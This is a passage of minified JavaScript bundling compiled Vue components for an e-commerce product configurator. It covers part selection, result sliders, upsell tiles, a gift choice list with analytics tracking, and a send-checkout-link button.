"),n("transition",{attrs:{name:"assembled-product-transition"}},[e.shouldShowAssembledProductImage?n("assembled-product",{attrs:{isVisible:e.shouldShowProduct,isTablet:e.isTablet,isDesktop:e.isDesktop,isOverlayVisible:e.isOverlayVisible,isUpsellScreen:e.shouldShowUpsellFooter},on:{productStyleSet:e.onProductStyleSet,clickBackButton:e.onClickUpsellBackButton}}):e._e(),e._v(" "),e.shouldShowResultScreen?n("result-slider",{attrs:{isDesktop:e.isDesktop},on:{shouldHideResultFooter:e.onHideResultFooter,clickBackButton:e.onClickResultBackButton}}):e._e()],1),e._v(" "),n("transition",{attrs:{name:e.transitionName}},[e.shouldShowUpsellFooter?n("upsell-footer",{key:"upsellFooter",class:e.partsFooterClass,attrs:{isMobile:e.isMobile,isTablet:e.isTablet,isDesktop:e.isDesktop,upsellBackButtonClicked:e.upsellBackButtonClicked},on:{clickDonePartsButton:e.onClickDoneUpsellButton}}):e._e(),e._v(" "),e.shouldShowPartsFooter?n("parts-footer",{key:"partsFooter",class:e.partsFooterClass,attrs:{isDesktop:e.isDesktop},on:{clickCancelPartsButton:e.onClickCancelPartsButton,clickDonePartsButton:e.onClickDonePartsButton}}):e._e(),e._v(" "),e.shouldShowOptionsFooter?n("options-footer",{key:"optionsFooter",attrs:{isMobile:e.isMobile,isTablet:e.isTablet,isDesktop:e.isDesktop},on:{overlayChange:e.onOverlayChange,optionFooterChange:e.onOptionFooterChange}}):e._e(),e._v(" "),e.shouldShowResultFooter?n("result-footer",{key:"resultFooter",attrs:{isDesktop:e.isDesktop,shouldShowButtons:e.shouldShowResultFooterButtons},on:{clickDetails:e.onClickResultDetailsButton,clickAddToCart:e.onClickResultAddToCartButton}}):e._e()],1),e._v(" "),n("transition",{attrs:{name:"footer-backdrop-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.isDesktop&&e.shouldShowFooter,expression:"isDesktop && shouldShowFooter"}],staticClass:"backdrop"})])],1),e._v(" "),n("transition",{attrs:{name:"backdrop-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowBackdrop,expression:"shouldShowBackdrop"}],staticClass:"backdrop"})]),e._v(" "),n("transition",{attrs:{name:"scrim-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowBackdrop,expression:"shouldShowBackdrop"}],staticClass:"scrim"})])],1):e._e(),e._v(" "),e.shouldShowDialog?n("div",{staticClass:"product-configurator has-dialog",attrs:{id:"product-configurator"}},[n("transition",{attrs:{name:"dialog-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowDialog,expression:"shouldShowDialog"}],staticClass:"dialog"},[n("button",{staticClass:"icon-close",attrs:{type:"button"},on:{click:e.onClickCancelDialogButton}},[n("span",{staticClass:"sr-only"},[e._v(e._s(e.dialogResources.close))])]),e._v(" "),n("p",[e._v("\n                    "+e._s(e.dialogMessage)+"\n                ")]),e._v(" "),e.isMobile?n("a",{attrs:{href:"javascript:void(0);"},on:{click:e.onClickCancelDialogButton}},[e._v("\n                    "+e._s(e.dialogResources.close)+"\n                ")]):e._e(),e._v(" "),e.isMobile?e._e():n("button",{staticClass:"btn btn--secondary",attrs:{type:"button"},on:{click:e.onClickCancelDialogButton}},[e._v("\n                    "+e._s(e.dialogResources.close)+"\n                ")])])]),e._v(" "),n("transition",{attrs:{name:"scrim-dialog-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowDialog,expression:"shouldShowDialog"}],staticClass:"scrim",on:{click:e.onClickCancelDialogButton}})])],1):e._e()])},v.staticRenderFns=[],t.hot&&((m=e("vue-hot-reload-api")).install(e("vue"),!0),m.compatible&&(t.hot.accept(),t.hot.data?m.reload("data-v-8b8daf7e",v):m.createRecord("data-v-8b8daf7e",v)))},{"../../../certificate-view":297,"../../../modules/helpers/isTabletView":490,"../../../modules/helpers/scroll":493,"../../../modules/util/isMobileWidth":516,"../assembled-product-zoom/assembled-product-zoom.vue":394,"../assembled-product/assembled-product.vue":395,"../options-footer/options-footer.vue":397,"../parts-footer/parts-footer.vue":400,"../product-intro/product-intro.vue":404,"../result-footer/result-footer.vue":406,"../result-slider/result-slider.vue":407,"../upsell/footer/upsell-footer.vue":410,axios:7,vue:279,"vue-hot-reload-api":275}],404:[function(e,t,n){t.exports={name:"product-intro",watch:{shouldShow:function(e){var t=this;!0===e?(this.animateIntro=!0,setTimeout((function(){t.animateIntro=!1}),1900),setTimeout((function(){t.introActive=!1}),2700)):(this.animateIntro=!1,this.introActive=!0)}},created:function(){this.shouldShow=!0},data:function(){return{animateIntro:!1,shouldShow:!1,introActive:!0}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this.$createElement,t=this._self._c||e;return t("div",{directives:[{name:"show",rawName:"v-show",value:this.introActive,expression:"introActive"}],staticClass:"intro"},[t("transition",{attrs:{name:"intro-text-transition"}},[t("div",{directives:[{name:"show",rawName:"v-show",value:this.animateIntro,expression:"animateIntro"}],staticClass:"intro-text"},[t("p",[this._t("default")],2)])]),this._v(" "),t("transition",{attrs:{name:"intro-backdrop-transition"}},[t("div",{directives:[{name:"show",rawName:"v-show",value:this.animateIntro,expression:"animateIntro"}],staticClass:"backdrop"})])],1)},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-08321dff",i):r.createRecord("data-v-08321dff",i)))},{vue:279,"vue-hot-reload-api":275}],405:[function(e,t,n){t.exports={name:"product-parts",props:{isDesktop:Boolean},methods:{select:function(e){this.$store.commit("addSnapshot"),this.$store.commit("setSelectedProductPart",e),this.$store.commit("setFooterMode","optionsFooter")},getPartName:function(e){var t=_slicedToArray(this.$store.getters.productLayers[e].split("-"),3),n=t[0],r=t[1],i=t[2],a=this.parts[n].showCategoryinOptionName,o=this.parts[n].categories[r].options[i].name,s=this.parts[n].categories[r].name;return o+(a?" "+s:"")},isPartAvailable:function(e){var t=_slicedToArray(this.$store.getters.productLayers[e].split("-"),3),n=t[0],r=t[1],i=t[2];return this.parts[n].categories[r].options[i].available},isPartSelected:function(e){return this.$store.getters.savedProductParts.includes(e)}},computed:{parts:function(){return this.$store.getters.productParts},resources:function(){return{notInStockLong:this.$store.getters.resourceGlobal.notInStockLong}}},data:function(){return{selectedPart:"Selected Part"}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"product-parts"},[n("ul",e._l(e.parts,(function(t,r){return n("li",[n("a",{class:{"icon-selected":e.isPartSelected(r)},attrs:{href:"javascript:void(0);"},on:{click:function(t){return e.select(r)}}},[n("span",{staticClass:"icon-holder"},[n("span",{class:"icon "+t.icon}),e._v(" "),e.isPartAvailable(t.depth)||e.isDesktop?e._e():n("span",{staticClass:"error-badge"})]),e._v(" "),n("span",{staticClass:"part-name"},[e._v(e._s(t.name))]),e._v(" "),e.isDesktop?n("span",{staticClass:"selected-part"},[e._v(e._s(e.getPartName(t.depth)))]):e._e(),e._v(" "),!e.isPartAvailable(t.depth)&&e.isDesktop?n("span",{staticClass:"error-message"},[e._v(e._s(e.resources.notInStockLong))]):e._e()])])})),0)])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-ee791032",i):r.createRecord("data-v-ee791032",i)))},{vue:279,"vue-hot-reload-api":275}],406:[function(e,t,n){t.exports={name:"result-footer",props:{isDesktop:Boolean,shouldShowButtons:Boolean},methods:{onClickAddToCart:function(){var e=this;setTimeout((function(){e.$emit("clickAddToCart")}),this.isDesktop?0:15)},onClickDetails:function(){var e=this;this.shouldShowButtonRow=!1,setTimeout((function(){e.$emit("clickDetails"),e.$store.commit("setFooterMode","partsFooter")}),this.isDesktop?0:15)}},watch:{shouldShowButtons:function(e){!1===e&&(this.shouldShowButtonRow=!1)}},computed:{resources:function(){return _objectSpread(_objectSpread({},this.$store.getters.resourceGlobal),{},{bundlePrice:this.$store.getters.resources.updateData.bundlePrice,bundleUSP:this.$store.getters.resources.updateData.bundleUSP,unitBasePrice:this.$store.getters.resources.updateData.unitBasePrice})},customizedHeading:function(){var e=_slicedToArray(this.$store.getters.productLayers[0].split("-"),3),t=e[0],n=e[1],r=e[2];return this.$store.getters.productParts[t].categories[n].options[r].stickyBarTitle}},mounted:function(){var e=this;setTimeout((function(){e.shouldShowButtonRow=!0}),this.isDesktop?0:200)},data:function(){return{shouldShowButtonRow:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"result-footer",attrs:{id:"resultFooter"}},[n("div",{staticClass:"product-description"},[n("div",{staticClass:"product-info-column product-info-column-details"},[n("div",{staticClass:"product-info-content"},[n("span",{staticClass:"result-label"},[e._v(e._s(e.resources.resultHeading))]),e._v(" "),n("h3",[e._v(e._s(e.customizedHeading))]),e._v(" "),e.isDesktop?n("p",[e._v(e._s(e.resources.bundleUSP))]):e._e(),e._v(" "),n("div",{staticClass:"product-info-footer"},[n("div",{staticClass:"product-price"},[n("div",{staticClass:"prices-container"},[n("span",{staticClass:"price-sales"},[e._v("\n                                "+e._s(e.resources.bundlePrice.formattedSale)+"\n                            ")]),e._v(" "),e.resources.unitBasePrice?n("span",{staticClass:"unit-base-price"},[e._v("\n                                "+e._s(e.resources.vatIncluded)+"\n                                "+e._s(e.resources.unitBasePriceLabel)+"\n                                "+e._s(e.resources.unitBasePrice.original_volume)+"\n                                "+e._s(e.resources.unitBasePrice.base_price_text)+"\n                            ")]):e._e()])]),e._v(" "),n("button",{class:["btn",{active:!e.isDesktop&&e.shouldShowButtonRow}],attrs:{type:"submit"},on:{click:e.onClickAddToCart}},[e._v("\n                        "+e._s(e.resources.addToCart)+"\n                    ")]),e._v(" "),n("button",{class:["btn","btn--secondary",{active:!e.isDesktop&&e.shouldShowButtonRow}],attrs:{type:"submit"},on:{click:e.onClickDetails}},[e._v("\n                        "+e._s(e.resources.details)+"\n                    ")])])])])])])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-45f2268e",i):r.createRecord("data-v-45f2268e",i)))},{vue:279,"vue-hot-reload-api":275}],407:[function(e,t,n){var r,i,a;r=e("../slider-controls/slider-controls.vue"),i=e("../../../../../node_modules/vue-slick-carousel"),a=e("../image-layer/image-layer.vue"),t.exports={name:"result-slider",components:{SliderControls:r,VueSlickCarousel:i,ImageLayer:a},props:{isDesktop:Boolean},methods:{onClickBack:function(){var e=this;this.$emit("shouldHideResultFooter"),setTimeout((function(){e.$emit("clickBackButton")}),this.isDesktop?0:15)},onClickArrowLeft:function(){this.$refs.resultCarousel.prev()},onClickArrowRight:function(){this.$refs.resultCarousel.next()},onBeforeChange:function(e,t){this.currentSlide=t},setIndicatorLeft:function(){this.indicatorLeft=this.indicatorWidth*this.currentSlide},setIndicatorWidth:function(){var e=this.$refs.resultCarousel.$root.$el.querySelector(".slick-dots .slick-active"),t=e?e.getBoundingClientRect():"";this.indicatorWidth=e?t.width:0}},watch:{currentSlide:function(){this.setIndicatorLeft()}},computed:{images:function(){var e=[],t=this.$store.getters.productParts,n=this.$store.getters.productLayers;if(this.$store.getters.resources.updateData.isTalisman){var r={};n.forEach((function(e){var n=_slicedToArray(e.split("-"),3),i=n[0],a=n[1],o=n[2],s=t[i].categories;r[t[i].resourceId]=s[a].options[o].EAN}));for(var i=0,a=Object.values(this.$store.getters.resources.updateData.talismanImagePlaceholders);i<a.length;i++){var o=a[i];o.src=String.format(o.urlFormat,r.bottle,r.fragrance,r.talisman,r.cap),e.push(o)}return e}var s=_slicedToArray(n[1].split("-"),3),l=s[0],c=s[1],u=s[2],d=t[l].categories[c].options[u];e.push(d.howToUseImage),e.push(d.productLifestyleImage);for(var p=0,h=Object.values(d.primaryAndSecondaryImages);p<h.length;p++){var f=h[p];e.push(f)}return e}},mounted:function(){this.setIndicatorLeft(),this.setIndicatorWidth(),this.showLeftArrow=this.showRightArrow=1<this.images.length},data:function(){return{currentSlide:0,indicatorLeft:0,indicatorWidth:0,showLeftArrow:!0,showRightArrow:!0,sliderSettings:{arrows:!1,centerPadding:"0",dots:!0,infinite:!0,touchThreshold:500,responsive:[{breakpoint:1024,settings:{centerMode:!0,centerPadding:"20%",focusOnSelect:!0,slidesToShow:1,speed:150,swipe:!0}},{breakpoint:767,settings:{centerMode:!0,centerPadding:"14%",focusOnSelect:!0,slidesToShow:1,speed:150,swipe:!0}}],slidesToShow:1,swipe:!1,waitForAnimate:!1}}}},t.exports.__esModule&&(t.exports=t.exports.default);var o,s="function"==typeof t.exports?t.exports.options:t.exports;s.functional,s.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"result-slider-wrapper"},[n("button",{staticClass:"icon-arrow3--left restart-button fixed",attrs:{type:"button"},on:{click:function(t){return e.onClickBack()}}},[n("span",{staticClass:"sr-only"},[e._v("Move back")])]),e._v(" "),n("div",{ref:"resultSlider",staticClass:"result-slider"},[n("div",{staticClass:"configured-product"},[n("VueSlickCarousel",e._b({ref:"resultCarousel",on:{beforeChange:e.onBeforeChange}},"VueSlickCarousel",e.sliderSettings,!1),e._l(e.images,(function(t,r){return n("image-layer",{attrs:{wrapperClass:r===e.currentSlide?"result-slider-image selected":"result-slider-image",image:t}})})),1)],1),e._v(" "),n("div",{staticClass:"configurator-slider-indicator"},[n("span",{staticClass:"configurator-current-slide",style:"left: "+e.indicatorLeft+"px; width: "+e.indicatorWidth+"px"})]),e._v(" "),n("slider-controls",{attrs:{showLeftArrow:e.showLeftArrow,showRightArrow:e.showRightArrow,showArrowBackground:!0},on:{clickArrowLeft:function(t){return e.onClickArrowLeft()},clickArrowRight:function(t){return e.onClickArrowRight()}}})],1)])},s.staticRenderFns=[],t.hot&&((o=e("vue-hot-reload-api")).install(e("vue"),!0),o.compatible&&(t.hot.accept(),t.hot.data?o.reload("data-v-71d14a76",s):o.createRecord("data-v-71d14a76",s)))},{"../../../../../node_modules/vue-slick-carousel":277,"../image-layer/image-layer.vue":396,"../slider-controls/slider-controls.vue":408,vue:279,"vue-hot-reload-api":275}],408:[function(e,t,n){t.exports={name:"slider-controls",props:{showLeftArrow:{type:Boolean,default:!0},showRightArrow:{type:Boolean,default:!0},showArrowBackground:{type:Boolean,default:!1}},methods:{onClickArrowLeft:function(){this.$emit("clickArrowLeft")},onClickArrowRight:function(){this.$emit("clickArrowRight")}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"configurator-slider-controls"},[n("button",{class:["icon-arrow3--left","slider-button",{hidden:!e.showLeftArrow},{"has-background":e.showArrowBackground}],attrs:{type:"button"},on:{click:function(t){return e.onClickArrowLeft()}}},[n("span",{staticClass:"sr-only"},[e._v("Move to left")])]),e._v(" "),n("button",{class:["icon-arrow3--right","slider-button",{hidden:!e.showRightArrow},{"has-background":e.showArrowBackground}],attrs:{type:"button"},on:{click:function(t){return e.onClickArrowRight()}}},[n("span",{staticClass:"sr-only"},[e._v("Move to right")])])])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-307cbd67",i):r.createRecord("data-v-307cbd67",i)))},{vue:279,"vue-hot-reload-api":275}],409:[function(e,t,n){t.exports={name:"status-bar",props:{message:{type:String,default:""}},computed:{productLayers:function(){return this.$store.getters.productLayers},parts:function(){return this.$store.getters.productParts},status:function(){if(this.message&&0<this.message.length)return this.message;for(var e=!1,t="",n=0;n<this.productLayers.length;n++){var r=_slicedToArray(this.productLayers[n].split("-"),3),i=r[0],a=r[1],o=r[2],s=this.parts[i].categories[a].options[o],l=this.parts[i];if(!s.available){if(e)return this.$store.getters.resourceGlobal.unavailableCustomisation;e=!0,t=this.$store.getters.resourceGlobal.unavailableCustomConfiguration+" "+l.resourceName.toLowerCase()}}return t}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticClass:"status-bar"},[t("p",[this._v(this._s(this.status))])])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-545139be",i):r.createRecord("data-v-545139be",i)))},{vue:279,"vue-hot-reload-api":275}],410:[function(e,t,n){var r;r=e("../page/upsell-page.vue"),t.exports={props:{isMobile:Boolean,isTablet:Boolean,isDesktop:Boolean,upsellBackButtonClicked:Boolean},components:{UpsellPage:r},computed:{resources:function(){return this.$store.getters.upsellData.resources}},methods:{handleFinish:function(){var e=this;this.shouldShowHeader=!this.isTablet,setTimeout((function(){e.$emit("clickDonePartsButton")}),this.isTablet?800:0)}},watch:{upsellBackButtonClicked:function(e){this.shouldShowHeader=!this.isTablet||!1===e}},mounted:function(){this.shouldShowHeader=!0},data:function(){return{shouldShowHeader:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{ref:"upsellFooter",staticClass:"options-footer upsell-footer full-height-footer",attrs:{id:"upsellFooter"}},[n("transition",{attrs:{name:"footer-header-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowHeader,expression:"shouldShowHeader"}],staticClass:"footer-header"},[n("h3",[e._v(e._s(e.resources.heading))])])]),e._v(" "),n("upsell-page",{attrs:{isDesktop:e.isDesktop,isMobile:e.isMobile}}),e._v(" "),n("div",{staticClass:"button-row single-button"},[n("button",{staticClass:"btn",attrs:{disabled:e.shouldShowStatusBar},on:{click:function(t){return e.handleFinish()}}},[e._v(e._s(e.resources.finishedCta))])])],1)},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-578a8e1b",a):i.createRecord("data-v-578a8e1b",a)))},{"../page/upsell-page.vue":411,vue:279,"vue-hot-reload-api":275}],411:[function(e,t,n){var r;r=e("../product-tile/product-tile.vue"),t.exports={props:{isMobile:Boolean,isDesktop:Boolean},components:{ProductTile:r},computed:{upsellData:function(){return this.$store.getters.upsellData}},methods:{setSelected:function(e){this.$store.commit("setProductId",e.id),this.$store.commit("setProductParts",e.productParts),this.$store.commit("setResources",e.resources)},isSelected:function(e){return this.$store.getters.productId===e}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"upsell-options"},[n("ul",e._l(e.upsellData.products,(function(t){return n("li",[n("product-tile",{key:t.id,attrs:{product:t,isMobile:e.isMobile}})],1)})),0)])},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-4a8c8f03",a):i.createRecord("data-v-4a8c8f03",a)))},{"../product-tile/product-tile.vue":412,vue:279,"vue-hot-reload-api":275}],412:[function(e,t,n){var r;r=e("./talisman/product-tile.vue"),t.exports={props:{isMobile:Boolean,product:Object},computed:{upsellData:function(){return this.$store.getters.upsellData},upsellProductTileType:function(){switch(this.upsellData.productType){case"talisman":return r;default:return}}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this.$createElement;return(this._self._c||e)(this.upsellProductTileType,{tag:"component",attrs:{product:this.product,isMobile:this.isMobile}})},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-6df6684b",a):i.createRecord("data-v-6df6684b",a)))},{"./talisman/product-tile.vue":413,vue:279,"vue-hot-reload-api":275}],413:[function(e,t,n){var r;r=e("../../../../../dam/dam-helper"),t.exports={props:{isMobile:Boolean,product:Object},computed:{productName:function(){var e=_slicedToArray(this.$store.getters.productLayers[0].split("-"),3),t=e[0],n=e[1],r=e[2];return this.product.productParts[t].categories[n].options[r].title},productImage:function(){var e,t=this.$store.getters.productLayers,n=this.$store.getters.productParts,r={},i=this.product.resources.updateData.talismanImagePlaceholders.secondaryImageThird,a=_createForOfIteratorHelper(t);try{for(a.s();!(e=a.n()).done;){var o=_slicedToArray(e.value.split("-"),3),s=o[0],l=o[1],c=o[2],u=n[s];r[u.resourceId]=u.categories[l].options[c]}}catch(e){a.e(e)}finally{a.f()}return i.src=String.format(i.urlFormat,r.bottle.EAN,r.fragrance.EAN,r.talisman.EAN,r.cap.EAN),i},resources:function(){return _objectSpread(_objectSpread({},this.$store.getters.resourceGlobal),{},{bundlePrice:this.product.resources.updateData.bundlePrice,bundleUSP:this.product.resources.updateData.bundleUSP,unitBasePrice:this.product.resources.updateData.unitBasePrice})},selected:function(){return this.$store.getters.productId===this.product.id}},methods:{setSelected:function(){this.$store.commit("setProductId",this.product.id),this.$store.commit("setProductParts",this.product.productParts),this.$store.commit("setResources",this.product.resources)}},mounted:function(){this.isMobile&&r.updateImages(this.$refs.upsellImageLayer)}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"upsell-option"},[e.isMobile?n("figure",{ref:"upsellImageLayer"},[n("img",{class:e.productImage.class,attrs:{alt:"",src:e.productImage.placeholder,"data-src":e.productImage.src,"data-width":e.productImage.width}})]):e._e(),e._v(" "),n("label",{class:{selected:e.selected},attrs:{for:"upsell-product-"+e.product.id}},[n("span",{staticClass:"upsell-product-title",domProps:{innerHTML:e._s(e.productName)}}),e._v(" "),n("span",{staticClass:"upsell-product-description"},[e._v(e._s(e.product.description))]),e._v(" "),n("div",{staticClass:"upsell-product-price"},[n("span",[e._v("\n                "+e._s(e.resources.bundlePrice.formattedSale)+"\n            ")]),e._v(" "),e.resources.unitBasePrice?n("span",[e._v("\n                "+e._s(e.resources.vatIncluded)+"\n                "+e._s(e.resources.unitBasePriceLabel)+"\n                "+e._s(e.resources.unitBasePrice.original_volume)+"\n                "+e._s(e.resources.unitBasePrice.base_price_text)+"\n            ")]):e._e()])]),e._v(" "),n("input",{attrs:{type:"radio",name:"product-option",id:"upsell-product-"+e.product.id,disabled:!e.product.available},domProps:{value:e.product.id,checked:e.selected},on:{click:function(t){return e.setSelected()}}}),e._v(" "),e.product.available?e._e():n("span",{staticClass:"error-message"},[e._v(e._s(e.resources.notInStockShort))])])},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-0b13ccfb",a):i.createRecord("data-v-0b13ccfb",a)))},{"../../../../../dam/dam-helper":430,vue:279,"vue-hot-reload-api":275}],414:[function(e,t,n){var r,i;r=e("../../../dam/dam-helper"),i=e("../../../modules/google").tagManager,t.exports={name:"product-choice-list",props:{products:Array,resources:Object,selectedID:String,onProductPicked:{type:Function,default:function(){}}},methods:{onProductSelected:function(e){this.selectedProductID=e},productPicked:function(){var e,t,n;this.onProductPicked(this.selectedProductID),window.eventBus.$emit("shouldCloseFlyin"),e=this.products[0].analyticsData,n={event:"addToCartGift",currencyCode:(t=JSON.parse(e)).currencyCode,gift:t.productData,gift_type:t.promotionName},i.pushDataLayerEvent(n)}},mounted:function(){r.updateImages(this.$refs.productChoiceOptions)},updated:function(){r.updateImages(this.$refs.productChoiceOptions)},data:function(){return{selectedProductID:this.selectedID||this.products[0].productID}}},t.exports.__esModule&&(t.exports=t.exports.default);var a,o="function"==typeof t.exports?t.exports.options:t.exports;o.functional,o.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"product-choice-list"},[n("div",{staticClass:"product-choice-scroll"},[n("header",{staticClass:"product-choice-header"},[n("h2",[e._v(e._s(e.resources.title))]),e._v(" "),n("span",[e._v(e._s(e.resources.subtitle))])]),e._v(" "),n("div",{ref:"productChoiceOptions",staticClass:"product-choice-options"},e._l(e.products,(function(t){return n("div",{key:t.productID,class:["input-type-radio",{chosen:e.selectedProductID===t.productID}]},[n("input",{attrs:{type:"radio",id:t.productID,name:"bonusChoiceProducts"},domProps:{value:t.productID,checked:e.selectedProductID===t.productID},on:{click:function(n){return e.onProductSelected(t.productID)}}}),e._v(" "),n("label",{staticClass:"vue-form-group-label",attrs:{for:t.productID}},[n("span",{staticClass:"option-ritual"},[e._v("\n                        "+e._s(t.productHeading)+"\n                    ")]),e._v(" "),n("span",{staticClass:"option-title"},[e._v("\n                        "+e._s(t.productName)+"\n                    ")]),e._v(" "),n("img",{class:t.productImageClass,attrs:{src:t.productImagePlaceholder,alt:t.productImageAlt,"data-src":t.productImageUrl}})])])})),0)]),e._v(" "),n("footer",{staticClass:"product-choice-footer"},[n("a",{staticClass:"btn",attrs:{title:e.resources.cta},on:{click:e.productPicked}},[e._v("\n            "+e._s(e.resources.cta)+"\n        ")])])])},o.staticRenderFns=[],t.hot&&((a=e("vue-hot-reload-api")).install(e("vue"),!0),a.compatible&&(t.hot.accept(),t.hot.data?a.reload("data-v-71f319e8",o):a.createRecord("data-v-71f319e8",o)))},{"../../../dam/dam-helper":430,"../../../modules/google":474,vue:279,"vue-hot-reload-api":275}],415:[function(e,t,n){var r,i,a,o;r=e("vuex").mapState,i=e("../../checkout/checkout-submit-handler"),a=e("axios"),o=e("../../../social-commerce/social-commerce"),t.exports={mixins:[i],data:function(){return{showSpinner:!1,showCheckmark:!1,showButton:!!this.$store.state.socialCommerceData}},computed:_objectSpread({},r("socialCommerceData",["resources","sendCheckoutLinkEndpointUrl","checkoutLinkConfig"])),components:{},methods:{onClickSendCheckoutLink:function(){var e=this;return _asyncToGenerator(regeneratorRuntime.mark((function t(){var n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.showCheckmark)return t.abrupt("return");t.next=2;break;case 2:e.toggleSpinner(!0),n=$.Deferred(),e.checkoutLinkConfig.shouldSendOrderOverview?o.handleImageSending(e.checkoutLinkConfig.data,e.toggleSpinner).then((function(){n.resolve()})):n.resolve(),$.when(n).always((function(){a.get(e.sendCheckoutLinkEndpointUrl,{timeout:2e5,params:{url:window.location.href}}).then((function(t){if(t.data.error)return e.toggleSpinner(!1),void o.errorView.show(t.data,(function(){e.onClickSendCheckoutLink()}));e.toggleSpinner(!0,!0)}))}));case 6:case"end":return t.stop()}}),t)})))()},toggleSpinner:function(e,t){var n=this;this.showSpinner=!1,this.showCheckmark=!1,e&&(t?this.showCheckmark=!0:this.showSpinner=!0,setTimeout((function(){n.toggleSpinner(!1,t)}),3e4))}}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("footer",{staticClass:"section-footer"},[e.showButton?n("button",{staticClass:"btn",attrs:{type:"button",id:"paymentbutton",disabled:e.showSpinner},on:{click:function(t){return e.onClickSendCheckoutLink()}}},[n("div",{class:[{"send-icon-visible":e.showCheckmark}]}),e._v(" "),n("div",{class:["spinner","white-spinner",{"spinner-visible":e.showSpinner}]},[n("span"),e._v(" "),n("span"),e._v(" "),n("span")]),e._v(" "),e.showSpinner||e.showCheckmark?e._e():[e._v("\n            "+e._s(e.resources.sendCheckoutLinkButtonText)+"\n        ")]],2):e._e()])},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-7c412292",l):s.createRecord("data-v-7c412292",l)))},{"../../../social-commerce/social-commerce":615,"../../checkout/checkout-submit-handler":304,axios:7,vue:279,"vue-hot-reload-api":275,vuex:281}],416:[function(e,t,n){var r=".vue-form-app",i={init:function(){0<document.querySelectorAll(r).length&&document.querySelectorAll(r).forEach((function(t){!function(t){new(e("vue"))({el:t,components:{VueForm:e("./vue-form/vue-form.vue"),VueInput:e("./vue-input/vue-input.vue")}})}(t)}))}};t.exports=i},{"./vue-form/vue-form.vue":417,"./vue-input/vue-input.vue":426,vue:279}],417:[function(e,t,n){t.exports={name:"vue-form",props:{action:{type:String,default:""},name:{type:String,default:""},method:{type:String,default:""},novalidate:{type:Boolean,default:!0},submit:{type:Function,default:function(){}}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vue-form"},[n("form",{attrs:{name:e.name,action:e.action,method:e.method,novalidate:e.novalidate},on:{submit:function(t){return t.preventDefault(),e.submit(t)}}},[e._t("default")],2)])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-780c0b99",i):r.createRecord("data-v-780c0b99",i)))},{vue:279,"vue-hot-reload-api":275}],418:[function(e,t,n){var 